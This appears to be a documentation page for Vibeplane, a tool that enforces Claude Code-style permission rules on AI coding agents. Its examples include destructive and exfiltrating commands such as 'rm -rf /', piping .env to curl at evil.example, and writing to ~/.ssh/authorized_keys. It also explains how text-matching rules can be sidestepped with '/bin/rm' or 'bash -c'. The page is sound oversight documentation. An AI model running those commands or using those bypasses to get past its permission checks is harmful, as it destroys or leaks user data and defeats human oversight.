+++
title = "Permissions"
description = "Claude Code's permission-rule syntax, implemented in full and resolved per repository — with every spelling that cannot work refused rather than carried."
weight = 22
[extra]
group = "reference"
+++

One rule set answers three callers: the synchronous permission hook for sessions Vibeplane only
watches, the protocol's permission request for runs it drives, and its own effects in the
[decision log](/docs/decisions/).

```toml
# vibeplane.toml
[policy]
auto_allow = [
  "Read",
  "Bash(pnpm test *)",
  "Edit(src/**)",
  "WebFetch(domain:docs.rs)",
]
never_auto = [
  "Bash(rm -rf *)",
  "Read(.env)",
  "mcp__*",
]
always_ask = [
  "Bash(git push *)",
]
```

A machine-wide set with the same shape lives in `~/.vibeplane/policy.toml`.

## The syntax is Claude Code's

A rule moves between `settings.json` and `vibeplane.toml` by cutting and pasting it. Every row below
is pinned by a test against the published specification, and the rules that decide most calls are
additionally checked against a **running Claude Code 2.1.270** — that a deny matching one subcommand
blocks the whole line, that an allow does not approve a compound command it only half-covers, that an
ask outranks the allow beside it, and that a single-segment directory pattern anchors as an allow
while the same pattern floats to any depth as a deny — and that an `Edit` deny covers the target of a
shell redirection, so `echo ok > secret.txt` does not write. Vibeplane agrees with the live product
on all fourteen probes.

### Tools

| You write | It matches |
|---|---|
| `Read`, `Bash` | every use of that tool |
| `Bash(*)` | the same as `Bash` |
| `mcp__github` | every tool from the `github` MCP server |
| `mcp__github__*` | the same |
| `mcp__github__get_*` | that server's `get_` tools |
| `mcp__github__create_issue` | one tool |
| `mcp__*`, `*`, `B*` | a glob over the whole tool name — **deny side only** |

An unanchored wildcard in `auto_allow` approves nothing, exactly as in Claude Code: `"*"` there would
hand an agent every tool on the machine, which nobody means and everybody would write by accident
once. A glob is only read on the allow side after a literal `mcp__<server>__` prefix.

### Commands

For `Bash` and `PowerShell`, the specifier is a command pattern. `*` matches any text, including
spaces.

| You write | Matches | Does not match |
|---|---|---|
| `Bash(npm run build)` | `npm run build` | `npm run build --watch` |
| `Bash(npm run *)` | `npm run build`, `npm run test --watch`, **`npm run`** | `npm install` |
| `Bash(npm run:*)` | the same — `:*` is the form the permission dialog writes | |
| `Bash(ls *)` | `ls -la`, **`ls`** | `lsof` |
| `Bash(ls*)` | `ls -la`, `lsof` | |
| `Bash(* --help *)` | `npm --help x` | `npm --help` |

Two subtleties worth knowing:

- **A trailing ` *` also matches the bare command** — but only when it is the rule's only wildcard.
  So `Bash(pnpm test *)` covers `pnpm test`, and `Bash(* --help *)` does not cover `npm --help`.
- **`:*` is recognised only at the end.** In `Bash(git:* push)` the colon is a literal character and
  the rule matches nothing.

> [!WARNING]
> Put the `*` after the subcommand. In `Bash(git * main)` the wildcard stands in for the subcommand,
> so the rule allows every git subcommand — including `-c`, which makes git run a program the agent
> names. `vibeplane check` warns about it.

#### Compound commands

A `Bash` rule is **not** matched against the whole command line. Like Claude Code, Vibeplane is aware
of shell operators — `&&`, `||`, `;`, `|`, `|&`, `&` and newlines — and matches each subcommand
separately. The two sides are deliberately not symmetric:

- **`never_auto` and `always_ask` fire when *any* subcommand matches**, including one nested in a
  subshell, a command substitution or a control-flow body. `Bash(rm *)` in `never_auto` stops
  `ls && rm -rf /`, `( cd /x && rm -rf . )` and `` echo `rm -rf /` ``.
- **`auto_allow` approves only when *every* subcommand matches.** `Bash(pnpm test *)` approves
  `pnpm test --run` and refuses to answer for `pnpm test && rm -rf /` — which then reaches you as a
  question, which is the point.

A line that ends in an operator with nothing after it, like `npm test &&`, is treated as unparseable
and approves nothing.

Before matching, a fixed set of wrappers is stripped — `timeout`, `time`, `nice`, `nohup`, `stdbuf`,
the builtins `command` and `builtin`, zsh's `noglob`, and bare `xargs` — so `Bash(npm test *)` also
matches `timeout 30 npm test`. The query form `command -v` is not stripped, and `xargs` with a flag
is matched as an `xargs` command. A leading environment assignment is looked past for `never_auto`
and `always_ask` whatever the variable, and for `auto_allow` only when the variable is a known-safe
one such as `NODE_ENV`.

### Commands no pattern rule can approve

Some forms Claude Code puts in front of a person **whatever an allow rule says**, so `auto_allow`
cannot answer for them either:

| Form | Why |
|---|---|
| `watch`, `setsid`, `ionice`, `flock` | each runs whatever follows it, so a prefix rule would approve a command nobody wrote down |
| `find` with `-exec`, `-execdir`, `-delete`, `-ok`, `-okdir` | runs a program, or removes files |
| anything over 10 000 characters | past what the command analysis reads, so neither side has understood it |

`Bash(watch *)` therefore approves nothing, and `vibeplane check` says so rather than letting it read
as protection. The escape hatch is Claude Code's own: **an exact rule still works**, so
`Bash(watch -n5 make build)` — no wildcard — speaks for exactly that call.

This cuts one way only. A `never_auto` or `always_ask` rule for `watch` still fires, because those
are exactly the commands somebody writes a prohibition for.

> [!WARNING]
> A `Bash` rule matches the text the agent writes, and it is **not a security boundary around the
> program**. `Bash(rm *)` stops `rm -rf build/`; it does not stop `/bin/rm -rf build/` or
> `bash -c 'rm -rf build/'`. That is Claude Code's behaviour and Vibeplane mirrors it rather than
> inventing a stricter rule that would refuse calls your own settings allow. Environment runners like
> `npx`, `docker exec` and `devbox run` are not wrappers either: `Bash(devbox run *)` covers whatever
> follows `run`, including `devbox run rm -rf .`. For a boundary that does not depend on command
> text, use a sandbox — this layer is accountability, not containment.

### Paths

For `Read` and `Edit`, the specifier is a **gitignore pattern**. `*` stays inside one path segment;
`**` crosses them. One `Edit(…)` rule covers every built-in tool that writes files and one `Read(…)`
rule every one that reads them, so two rules cover eight tools.

Four anchors, and confusing them is the most common mistake:

| You write | Anchored at | Example |
|---|---|---|
| `//path` | the filesystem root | `Read(//tmp/**)` |
| `~/path` | your home directory | `Read(~/.ssh/**)` |
| `/path` | **the file the rule is written in** | `Edit(/src/**)` in a `vibeplane.toml` means *that repository's* `src` |
| `path`, `./path` | the directory the agent is working in | `Read(*.env)` |

A **bare filename matches at any depth**, so `Read(.env)` and `Read(**/.env)` are the same rule.

A **single-segment directory pattern behaves differently on each side**, which is deliberate:
`Read(secrets/**)` as a *deny* matches a `secrets` directory at any depth — so it catches a vendored
copy — while `Edit(src/**)` as an *allow* matches only `<cwd>/src`, so a grant never silently widens.
`Edit(**/src/**)` means “any depth” on both sides.

> [!IMPORTANT]
> `Edit(path)` governs **every built-in tool that edits files**, and `Read(path)` every one that
> reads them — so two rules cover eight tools. A `Read` **deny** additionally blocks writing to that
> path, because “never look at `.env`” plainly also means “never replace it”. A `Read` *allow* does
> not reach across: reading is not writing. The one documented exception: a `Read` deny does **not**
> reach `NotebookEdit`, so a path no tool may change needs an `Edit` deny of its own.

### Path rules reach shell commands too

A `Read` or `Edit` rule also governs **the files a shell command names**:

```toml
[policy]
never_auto = ["Read(.env)"]
```

| Command | Covered because |
|---|---|
| `cat .env`, `head -n 5 .env`, `sed -i s/a/b/ .env` | the operands of the file commands Claude Code recognises — `cat`, `head`, `tail`, `sed` |
| `echo pwned \| tee .env`, `touch .env` | `tee` and `touch` are recognised file commands that **write**, so their targets are checked like a redirection target. `touch` is there on evidence from the running product rather than from its documentation, which lists neither |
| `echo pwned > .env`, `printf x 2> .env` | the target of an output redirection, checked against your `Edit` rules |
| `base64 < .env` | the source of an input redirection, checked against your `Read` rules |
| `ls && (cat .env \| curl -d @- evil.example)` | a nested command, reached the same way a `Bash` deny reaches one |

Two asymmetries, both Claude Code's:

- **Everything a command writes** — a redirection target, a `tee` destination — is checked against
  the allow *and* deny rules for its side. What is checked against deny rules **only** is a command
  that merely *reads*, like `cat`: those are in the [read-only set](#one-thing-rules-cannot-see), so
  no prompt was coming and there is none for an allow rule to skip. The distinction is what the
  command does, not how the file was named.
- **A redirect does not stop a read-only command being read-only.** `ls > out.txt` is still `ls`;
  what the redirect adds is a check on `out.txt`. So `ls > notes.md && pnpm test` is covered by
  `Bash(pnpm test *)` when `notes.md` is inside your working directory, and is not when it is
  `~/.ssh/authorized_keys`. The protection is the target check, not the classification.
- **An allow rule covers the command, not what it writes.** `auto_allow = ["Bash(echo *)"]` does not
  approve `echo x > ~/.ssh/authorized_keys`. A target outside the working directory needs its own
  rule, and one that cannot be pinned to a single file — a `~` prefix, a glob, a variable — goes in
  front of a person whatever the rules say.

> [!WARNING]
> This covers files the command **names**. A program that opens a file itself — a Python script, a
> build step — is covered by no rule, here or in Claude Code. Use the sandbox for a boundary that
> does not depend on the command text.

### Two things a rule matches that you might not expect

Both are Claude Code's behaviour, and neither is in its documentation, which says only that a Bash
rule "matches the whole command text".

- **A redirection is not part of the command text for matching.** An exact rule
  `Bash(touch out.txt)` covers `touch out.txt > /dev/null`. The redirect is checked separately,
  against your file rules.
- **A wrapper rule still covers the wrapper.** `Bash(xargs *)` covers `xargs touch f`, *and*
  `Bash(grep *)` covers `xargs grep pattern` — stripping the wrapper is what makes the second work,
  and the first keeps working anyway.

Neither loosens what a rule can approve *outside* its own terms: `Bash(echo *)` still does not answer
for `echo x > ~/.ssh/authorized_keys`, because an allow rule covers the command and not what it
writes.

### Symlinks are followed, and each side reads the pair differently

A path rule is matched against **both spellings** of a file: the path as written, and where it
actually resolves to.

- A **deny or ask** rule applies when *either* matches. So a repository that ships
  `config/key -> ~/.ssh/id_rsa` does not walk past `never_auto = ["Read(~/.ssh/**)"]`.
- An **allow** rule applies only when *both* match. A symlink inside an allowed directory that
  points outside it stops being approved and reaches you as a question.

A path with nothing behind it yet — the ordinary case for the target of a write — has one spelling,
and an allow rule still covers it. Creating a file is not refused by the rule written to permit it.

### Exceptions, with `!`

A deny or ask rule that begins with `!` is an exception, and it is scoped to the file it is written
in — so a project cannot use one to cancel a machine-wide prohibition:

```toml
[policy]
never_auto = ["Bash(git *)", "!Bash(git status *)"]
```

A bare `!` is ignored. In `auto_allow` it is refused, because an allow list is already the list of
exceptions.

### One rule shape Vibeplane declines

`Cd(<path>)` rules govern the `/cd` slash command — a person moving the session, not a tool call —
so nothing ever reaches Vibeplane's gate to match one. `vibeplane check` says so rather than letting
the rule look like protection. Keep it in `settings.json`, where Claude Code evaluates it.

### Hosts and parameters

```toml
[policy]
never_auto = [
  "WebFetch(domain:evil.example)",
  "Agent(isolation:worktree)",
]
```

`domain:` matches the URL's **host**, read out of it rather than found as a substring — so
`WebFetch(domain:docs.rs)` does not match `https://evil.example/docs.rs`.

`Tool(param:value)` matches a top-level input field, with `*` as a wildcard. `never_auto` and
`always_ask` only: one parameter being safe does not make a call safe. A parameter the model omits is
never matched.

## Three lists, and the order is deny → ask → allow

| List | Claude Code's name | What it does |
|---|---|---|
| `never_auto` | `permissions.deny` | refuses the call |
| `always_ask` | `permissions.ask` | puts it in front of a person, **whatever else matches** |
| `auto_allow` | `permissions.allow` | answers it without asking you |

The first match in that order decides, and **specificity does not change the order**: a broad deny
beats a narrow allow, and a matching ask prompts even when a more specific allow covers the same
call. So a deny rule cannot carry allowlist exceptions, and `always_ask` is how you carve a hole in
a broad `auto_allow`:

```toml
# vibeplane.toml — fragment
[policy]
auto_allow = ["Bash(git *)"]
always_ask = ["Bash(git push *)"]
```

That reads as "git is fine, but ask me before anything leaves this machine".

`always_ask` exists because Claude Code has the list and a rule has to have somewhere to go. Without
it, an `ask` rule moved across would vanish and the `auto_allow` beside it would approve exactly the
calls somebody wrote a rule to be asked about.

## Deny wins, in both directions

A project cannot allow what the machine forbids, and the machine's allow does not override a
project's deny. The same holds for `always_ask`: each stage is evaluated across **both** files before
the next one begins. Anything else would let a rule added in one place quietly widen a decision
written in another.

## A rule belongs to the project it protects

`Bash(pnpm test *)` is safe in the repository whose tests that runs and meaningless in the one beside
it. The policy is resolved from the **directory the agent is working in**, with a worktree inheriting
the rules of the checkout that owns it — both kinds: the `.claude/worktrees/<name>` layout Claude
Code and Vibeplane use, and anything `git worktree add` put elsewhere on the disk.

### The rules come from the checkout, the gates come from the branch

This asymmetry is deliberate, and it is the reason an agent cannot widen its own permissions.

An agent works on a branch, in a worktree, and it can edit any file there — including
`vibeplane.toml`. So the **permission rules** are read from the checkout that *owns* the worktree,
which is the copy on your trunk that you reviewed. A rule the agent adds to its own branch changes
nothing about what it is allowed to do.

The **gates** are read from the worktree, because the definition of done has to travel with the code:
a branch that adds a test suite should be checked by it. That direction is safe — a gate an agent
weakens still has to produce a green result that a person then looks at, and every run of it is in
the decision log.

Each rule set is evaluated against the directory it was **written in**, which is what a single
leading slash anchors to. The same `Read(/secrets/**)` means one thing in a `vibeplane.toml` and
another in `~/.vibeplane/policy.toml`; use `//` or `~/` for a machine-wide rule that should apply
inside every project.

## Rules that cannot work are refused

Claude Code lists the spellings it skips in its own startup dialog, and for a good reason: the
failure is silent, and on `never_auto` silence reads as permission. `vibeplane check` and
`work start` report the same ones **before an agent starts**.

| Refused | Why |
|---|---|
| `Write(src/**)`, `Glob(src/**)`, `NotebookEdit(x)` | file permissions are only checked against `Read(…)` and `Edit(…)`; these are accepted and never consulted |
| `mcp__github(create_issue)` | an `mcp__` rule with brackets is skipped on load |
| `Bash(command:rm *)` | bypassable by a compound command, so it is ignored; write `Bash(rm *)` |
| `Agent(model:opus)` in `auto_allow` | parameter rules are deny-side only |
| `*` or `mcp__*` in `auto_allow` | an unanchored wildcard approves nothing |
| `Agent(researcher)` | that tool has no field for a bare specifier to match |
| `Bash(rm -rf *` | the bracket was never closed — and a malformed **allow** rule grants nothing |
| `!Bash(ls *)` | Claude Code reads a leading `!` as a negation scoped to the settings file it is written in. Vibeplane does not implement it, and carried as written it would name a tool called `!Bash` and match nothing. Keep such a rule in `settings.json`, where Claude Code evaluates it |

And one **warning**, because the list behind it is a snapshot of somebody else's tool reference:

| Warned about | Why |
|---|---|
| `Bahs(rm *)`, `Stop Task` in `never_auto` or `always_ask` | the tool name is not one Claude Code documents, so the rule matches nothing. A prohibition with a typo in it is a dead prohibition. The name shown in the transcript is not always the one rules use — `Stop Task` is written `TaskStop` |

Verified against Claude Code 2.1.270: `claude doctor` reports the three refusals above that are
parse errors. The rest are spellings its own documentation describes as skipped, which `vibeplane
check` reports before an agent starts rather than after one has been paid for.

## One thing rules cannot see

Claude Code runs a built-in set of commands — `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`,
`find`, `wc`, `which`, `diff`, `stat`, `du`, `cd` and read-only forms of `git` — **without any
permission check**, in every mode. An `auto_allow` rule for one of them changes nothing, because
nothing was going to ask. A `never_auto` or `always_ask` rule *does* still apply, and is the only way
to put one of them back in front of a person.

```sh
vibeplane check
```

also prints the rules back, allow and deny, because a rule that parses, is legal and still covers
nothing anybody expected is only visible by reading it.

## Auto mode

Claude Code's **auto mode** reviews actions with a classifier instead of asking you, so routine calls
run without a prompt. A `PermissionRequest` hook fires only when Claude Code is about to *ask* —
which in auto mode is never. So Vibeplane installs two synchronous hooks:

| Hook | Fires | Carries |
|---|---|---|
| `PreToolUse` | before every tool call, in every mode | a prohibition, or nothing |
| `PermissionRequest` | only when a human was going to be asked | the full verdict, `allow` included |

`PreToolUse` never answers `allow`: that would skip Claude Code's permission system, classifier
included. Grants belong on the hook that fires only when a prompt was already coming.

**The effect:** `never_auto` and `always_ask` hold in every mode. `auto_allow` applies only where a
prompt would otherwise have interrupted you.

## Speed, and why it matters

Both gate hooks are **synchronous**: Claude Code is blocked on the answer. So evaluation is total,
in-process, and cannot wait on anything — there is no “policy service unreachable” path to fail open
through. `PreToolUse` fires on every tool call, so the cost matters:

- A check costs **under 200&nbsp;µs**, path rules included, asserted by a test over 10 000 lookups.
- A full round trip over loopback, worst of 50 consecutive requests, is **under 50&nbsp;ms**.
- The matcher is **linear, not backtracking**. The pattern is yours but the text is a command an
  agent chose, and a matcher that can be made exponential by its subject is a denial of service
  against the hook a session is waiting on.

The policy is cached per repository and invalidated by the file's modification time, re-checked at
most once a second — so a rule written now takes effect while you are still looking at the terminal,
and ten thousand checks are not ten thousand file reads.

## When the file is broken

A malformed `vibeplane.toml` **keeps the rules it had**. A typo in a deny rule must never read as
“no rules”.

That is only half an answer, because a daemon restarted against a broken file has no previous rules
to keep — so `vibeplane doctor` names the project and says its rules are not in force, rather than
leaving it to a log line.

## Driven runs speak the same vocabulary

The protocol's permission request carries the **tool kind** the agent declared and the **arguments it
chose**, and those are what the rules are matched against:

| Protocol kind | Evaluated as |
|---|---|
| `execute` | `Bash` |
| `read`, `search` | `Read` |
| `edit`, `delete`, `move` | `Edit` |
| `fetch` | `WebFetch` |

A call that maps to none of them — and carries no recognisable arguments — is **not evaluated at
all**, and a person is asked. A rule cannot honestly be said to cover a call nobody can classify, and
that is the direction it is safe to be wrong in.

## How you find out a rule is too tight

**A refused agent does not stop — it tries something else.** So a rule that is exactly right and one
that is far too broad look the same on the board: a session still working, a cost column still
climbing, nothing in the inbox.

Refusals are counted. Five in one live run raises a `refused` item naming the rule that stopped it:

```console
$ vibeplane inbox
refused   core-lib   7 calls refused in this run
          The last one was `Bash`, refused by `Bash(git *)`. Check that the rule means
          what you meant.
```

It never interrupts — `normal` level — and `vibeplane attention` reports what became of every one, so
a threshold that is wrong shows up in the `dismissed` column.

## Every verdict is recorded

With the rule named. See [the decision log](/docs/decisions/).
